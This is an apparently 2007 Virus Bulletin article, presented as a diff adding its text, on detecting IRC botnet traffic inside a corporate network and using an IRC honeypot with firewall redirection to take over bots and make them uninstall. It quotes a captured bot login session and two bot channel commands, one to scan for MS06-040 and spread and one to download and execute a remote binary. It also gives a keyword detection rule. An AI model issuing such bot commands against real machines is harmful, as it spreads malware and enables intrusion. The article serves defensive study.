@@ -1,0 +1,137 @@
+Defeating IRC bots on the internal network
+2007-02-01
+
+Vinoo Thomas
+McAfee Avert Labs
+,
+India
+
+Nitin Jyoti
+McAfee Avert Labs
+,
+India
+Editor:
+Helen
+
+Martin
+Abstract
+Fuelled by financial incentives and readily available source code, malware authors pursue aggressively the development of newer bot modules and the exploitation of code into these bots. Vinoo Thomas and Nitin Jyoti describe how an IRC honeypot can be used to provide an early warning system for botnet activity.
+Copyright © 2007 Virus Bulletin
+
+Introduction
+The rapid growth of botnets represents the greatest computer security threat facing individuals and corporations today. Fuelled by financial incentives and readily available source code, malware authors pursue aggressively the development of newer modules and the exploitation of code into these bots.
+For an organization, internal bot infections can have serious repercussions, including the loss of man hours and downtime. The average cost of such incidents runs into tens of thousands of dollars [1].
+An early warning system that alerts on and captures bot-like activity in the internal network can be a big help in containing and isolating sources of infection. Having a controlled worm replication environment available in-house can also be helpful, allowing for the quick evaluation of captured worm samples and speedy implementation of countermeasures.
+This article describes the process of setting up an IRC honeypot on the network – using minimal resources and requiring little maintenance – which can then be used as an early warning system for botnet activity. We also discuss using the IRC honeypot to gain control of infected machines and remove bots from infected machines.
+
+Background
+Bots have developed IM (instant messaging), MM (mass-mailing) and P2P (peer-to-peer sharing) capabilities. They also drop rootkits in order to conceal their presence on infected systems. Once a network is infected, cleaning can be difficult for the following reasons:
+If machines are unpatched, a cleaning tool or an anti-virus program is not going to be of much help. Reinfection will occur almost immediately as long as there are other infected machines on the network.
+The volume of network traffic created by bots makes it impossible for an administrator to perform a Windows update on affected machines.
+Bots tend to kill AV and firewall processes, which makes cleaning a system difficult, even with updated signatures, as the AV is killed at launch.
+Bots modify registry entries so they remain active even when the infected machine is booted in Windows safe mode.
+These scenarios could be dealt with quickly and effectively if an IRC server were set up internally. This IRC server could act as a command and control centre for the bots, where one could issue centralized commands to stop or uninstall these bots on the network.
+
+The need for an IRC honeypot
+IRC (Internet Relay Chat) is the preferred communication method used by botnet herders to control botnets. IRC allows an attacker to control infected machines that are sitting behind NAT, and the bot can be configured to connect back to the command and control server listening on any port.
+Bots don’t replicate (or spread) unless specific instructions to do so are included during the bot’s compilation. The usual behaviour is for the bot to join a command and control server upon infecting a host and await instructions (which are usually pre-set). Thus, most bots will not replicate unless they can connect back to their command and control server to receive instructions.
+Upon infecting a host, a bot homes into a hard-coded IRC server and channel and attempts to join it. Once it has joined the channel successfully, the attacker can pass commands to the bot. Usually, channel topics are preset so that once a bot joins the channel, it executes the command immediately. And if the command is to scan for vulnerable systems and multiply, the bot does just that.
+By now, most organizations have implemented firewall rules that block standard Internet Relay Chat ports 6666–6669. In response to this, botnet herders have started to make their bots connect out on commonly used TCP ports 21, 80 or 443, which most corporate firewalls allow.
+To alert administrators to any IRC connection initiated from the LAN, irrespective of the destination port, one would need software or an appliance that inspects traffic at the gateway level. IRC connections are usually transmitted in clear text and have distinct commands that are passed between the client and server for communication.
+One possible method is running a sniffer on the mirror port or monitor port of the switch and setting a rule to trigger an alert for IRC traffic. The following is a sample sniffer capture that is observed when an IRC bot homes into an IRC server:
+NICK ccoe
+USER ccoe “hotmail.com” “xxxxx.bounceme.net” :ccoe
+:irc.botspot.com NOTICE AUTH :*** Looking up your
+hostname...
+The bot attempts a connection to an IRC server with a domain name registered with a dynamic DNS provider:
+:irc.botspot.com NOTICE AUTH :*** Couldn’t resolve
+your hostname; using your IP address instead
+:irc.botspot.com NOTICE ccoe :*** If you are
+having problems connecting due to ping timeouts,
+please type /quote pong BCDAEF64 or /raw pong
+BCDAEF64 now.
+PING :BCDAEF64
+PONG :BCDAEF64
+:irc.botspot.com 001 ccoe :Welcome to the BotSpot
+IRC Network
+[email protected]
+
+:irc.botspot.com 002 ccoe :Your host is
+irc.botspot.com, running version Unreal3.2.3
+:irc.botspot.com 003 ccoe :This server was created
+Sun Mar 13 21:40:50 2005
+:irc.botspot.com 004 ccoe irc.botspot.com
+Unreal3.2.3 iowghraAsORTVSxNCWqBzvdHtGp
+lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
+:irc.botspot.com 005 ccoe SAFELIST HCN
+MAXCHANNELS=10 CHANLIMIT=#:10
+MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32
+TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20
+WALLCHOPS WATCH=128 :are supported by this server
+:irc.botspot.com 005 ccoe SILENCE=15 MODES=12
+CHANTYPES=# PREFIX=(qaohv)~&@%+
+CHANMODES=beI,kfL,lj,psmntirRcOAQKVGCuzNSMTG
+NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr
+ELIST=MNUCT STATUSMSG=~&@%+ EXCEPTS INVEX
+CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by
+this server
+:irc.botspot.com 251 ccoe :There are 1 users and 0
+invisible on 1 servers
+:irc.botspot.com 255 ccoe :I have 1 clients and 0
+servers
+:irc.botspot.com 265 ccoe :Current Local Users: 1
+Max: 5
+:irc.botspot.com 266 ccoe :Current Global Users: 1
+Max: 1
+After the server accepts the bot as a client, it sends information back to the client regarding the features supported by the server and message of the day, if any.
+:ccoe MODE ccoe :+iwx
+JOIN #specialchat sherubeta
+:
+[email protected]
+The bot attempts to join the attacker’s channel with a hard-coded password. Once successfully connected to the channel, the bot receives the topic of the channel and interprets it as a command.
+A typical channel topic could be set as follows so that the command is passed to the bot at the time of joining:
+.advscan netapi 200 5 0 -r -b –s
+This tells the bot to spread further by scanning machines vulnerable to the MS06-040 exploit using 200 concurrent threads and with a delay of five seconds for an unlimited time period (parameter 0). These scans would be random (parameter -r) and silent (parameter -s). The second example of a channel topic is as follows:
+.dl http://remoteserver/update.exe c:\a.exe 1
+This instructs the bot to download a binary from a remote web server and execute it (parameter 1). This could be used to update the bot upon connecting, or to download and execute further malware.
+If the channel topic does not contain a command for the bot, it sits idle in the channel, awaiting a command.
+In the example described above we observe certain unique keywords specific to IRC. The first thing that happens in Internet relay chat is that the client sends the commands ‘NICK’ and ‘USER’ in either order.
+By examining packets from the mirror port of the switch one can generate alerts for IRC traffic originating from the network. To implement this using a Windows box, a sniffer known as CommView [2] is connected to the mirror port of the switch. CommView allows Boolean logic to be used to create custom rules that will trigger an alert on a specified packet occurrence.
+In Figure 1, a combination of the keywords ‘NICK’ and ‘USER’ is used to trigger an alert every time IRC-like traffic is observed.
+Figure 1. A combination of keywords is used to trigger an alert.
+This rule set is very effective as it triggers irrespective of which port a bot attempts to use to connect to an IRC server. Once a packet is identified as per the rule set, the sniffer is configured to alert an administrator, capture all traffic for that session and dump it to a file.
+The IRC session dump comes in handy during network forensics to reconstruct the sequence of events, typically, when one has to replay captured network traffic.
+A captured IRC session can reveal the identity of the IRC server being contacted, the channel name, password to control the bot and whether any commands were passed back to the bot. With this information, we could approach the local CERT authorities, or volunteer security groups like ISOTF or Shadow Server that specialize in taking down botnets [3].
+
+Studying a captured bot sample
+Most bot samples are packed with the latest packers and encryptors for purposes of code obfuscation [4]. A quick way to view interesting strings of a packed sample is to execute it and take a memory dump of a running process.
+By searching the memory dump of the bot program for interesting strings, we can find commands that are supported by the bot. The IRC server and channel it connects to are always hard coded within the bot. With this information we’re all set to take control.
+Figure 2. Memory dump of a running process.
+
+Setting up an IRC Honeypot to disrupt a Botnet
+To set up an IRC honeypot, we can use any of the freely available IRC servers. In this instance, we used UnRealIRCd [5], placed in a DMZ network.
+From our analysis we already know which server and channel the bot in question will connect to. The sniffer indicates which port the bot uses to connect.
+At the firewall we create a rule to redirect IRC traffic to our IRC honeypot and ensure that we are logged into this channel before the bot connects.
+Figure 3. Using an IRC honeypot to disrupt a botnet.
+This way, we can become the channel operator and pass commands to the bot. A sample iptable rule on the firewall to this effect could be:
+iptables -t nat -A PREROUTING -i eth0 -s 192.168.1.0/24
+
+-p tcp —dport 6667 -j DNAT —to 192.168.2.2
+Upon execution, the bot is allowed to make an outbound DNS query to resolve the IRC server hostname. When it attempts to home into the attacker’s IRC server, the firewall redirects the IRC session to the honeypot. Once the bot connects successfully to our server, we pass the desired commands to the bot using the channel topic. (Earlier works, [6] and [7], go deeper into the syntactic details of issuing commands to various botnet families.)
+Every time the bot is kicked out of the channel it tries to reconnect immediately. Upon reconnection it executes whatever command is set as the current channel topic. If no command is set, the bots on the infected network connect to the channel and remain idle.
+Once we get the hang of passing commands to the bot, if supported, we can issue an uninstall command and every bot that connects to this channel hereafter will uninstall itself from the infected machine.
+Figure 4. Once we get the hang of passing commands to the bot, if supported, we can issue an uninstall command and every bot that connects to this channel hereafter will uninstall itself from the infected machine.
+
+Outlook
+Bot technology is evolving rapidly, often aided and abetted, unfortunately, by the open-source movement [8]. As more and more ISPs and IRC operators clamp down on illegal botnets, malware authors are looking at alternate command and control mechanisms, such as IM and P2P.
+The ‘bad guys’ of today test their malicious code against popular anti-virus products to ensure their creations are undetectable before releasing them into the wild. For an organization to be equipped to deal with a zero-day outbreak, it should have proactive defence mechanisms in place to keep pace with ever-evolving threats.
+
+Bibliography
+[1] CommView Sniffer. http://en.wikipedia.org/wiki/Zotob, http://www.pwc.com/uk/eng/ins-sol/publ/pwc_dti-fullsurveyresults06.pdf.
+[2] CommView Sniffer. http://www.tamosoft.com/.
+[3] ISOTF: http://isotf.org/. Shadow Server: http://www.shadowserver.org/.
+[4] Myers, L. AIM for bot coordination. Proceedings of the Virus Bulletin International Conference 2006. http://www.mcafee.com/us/local_content/white_papers/threat_center/wp_vb2006_myers.pdf.
+[5] UnRealIRCd. http://www.unrealircd.com/.
+[6] The Honeynet Project & Research Alliance. Know your enemy: tracking botnets. March 2005. http://www.honeynet.org/papers/bots/.
+[7] Barford, P.; Yegneswaran, V. An inside look at botnets. Advances in Information Security. Springer. 2006. http://www.cs.wisc.edu/~pb/botnets_final.pdf.
+[8] Baylor, K.; Brown, C. Killing Botnets: a view from the trenches. McAfee white paper. October 2006. http://www.mcafee.com/us/local_content/white_papers/wp_botnet.pdf.
